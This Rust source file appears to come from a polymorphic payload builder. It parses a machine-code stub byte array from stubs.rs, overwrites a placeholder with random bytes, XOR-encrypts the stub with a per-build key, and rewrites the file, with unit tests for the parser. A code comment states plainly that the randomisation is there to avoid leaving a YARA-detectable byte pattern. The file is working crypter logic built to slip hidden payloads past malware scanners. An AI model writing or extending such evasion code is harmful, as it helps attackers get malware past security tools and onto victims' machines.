use std::fs;
use std::path::Path;

use crate::polymorph::Polymorph;

pub fn rewrite_stubs(folder: &Path, polymorph: &mut Polymorph) -> Result<(), Box<dyn std::error::Error>> {
    let stubs_path = folder.join("src").join("stubs.rs");
    let original = fs::read_to_string(&stubs_path)
        .map_err(|e| format!("read stubs.rs: {e}"))?;

    let mut plaintext = parse_stub_bytes(&original)
        .ok_or_else(|| "stubs.rs: could not locate STUB byte array".to_string())?;

    let placeholder_offset = find_placeholder(&plaintext)
        .ok_or_else(|| "stubs.rs: did not find 8-byte 0x11 placeholder".to_string())?;

    // Random bytes here so the ciphertext does not carry 8 identical bytes
    // in a row at a fixed offset (a cheap YARA pattern by itself).
    for i in 0..8 {
        plaintext[placeholder_offset + i] = (polymorph.random_u64() & 0xFF) as u8;
    }

    let key = polymorph.api_key();
    let encrypted: Vec<u8> = plaintext.iter().map(|b| b ^ key).collect();

    let bytes_lit: Vec<String> = encrypted.iter().map(|b| format!("0x{:02x}", b)).collect();
    let content = format!(
        "pub const STUB: &[u8] = &[{}];\n\
         pub const STUB_PLACEHOLDER_OFFSET: usize = {};\n",
        bytes_lit.join(", "),
        placeholder_offset,
    );
    fs::write(&stubs_path, content)
        .map_err(|e| format!("write stubs.rs: {e}"))?;
    Ok(())
}

fn parse_stub_bytes(src: &str) -> Option<Vec<u8>> {
    let marker = "pub const STUB: &[u8] = &[";
    let start = src.find(marker)? + marker.len();
    let rest = &src[start..];
    let end = rest.find("];")?;
    let body = &rest[..end];

    let mut out = Vec::with_capacity(512);
    for token in body.split(',') {
        let t = token.trim();
        if t.is_empty() {
            continue;
        }
        let hex = t.trim_start_matches("0x").trim_start_matches("0X");
        let b = u8::from_str_radix(hex, 16).ok()?;
        out.push(b);
    }
    Some(out)
}

fn find_placeholder(bytes: &[u8]) -> Option<usize> {
    bytes.windows(8).position(|w| w == [0x11u8; 8])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_handles_multiline_hex_array() {
        let src = r#"
            pub const STUB: &[u8] = &[
                0x55, 0x56, 0x57,
                0x65, 0x48, 0x8B,
            ];
        "#;
        assert_eq!(parse_stub_bytes(src), Some(vec![0x55, 0x56, 0x57, 0x65, 0x48, 0x8B]));
    }

    #[test]
    fn placeholder_offset_finds_8_byte_run() {
        let mut bytes = vec![0u8; 32];
        for i in 12..20 { bytes[i] = 0x11; }
        assert_eq!(find_placeholder(&bytes), Some(12));
    }

    #[test]
    fn no_placeholder_returns_none() {
        let bytes = vec![0x11u8; 7]; // 7, not 8
        assert_eq!(find_placeholder(&bytes), None);
    }
}
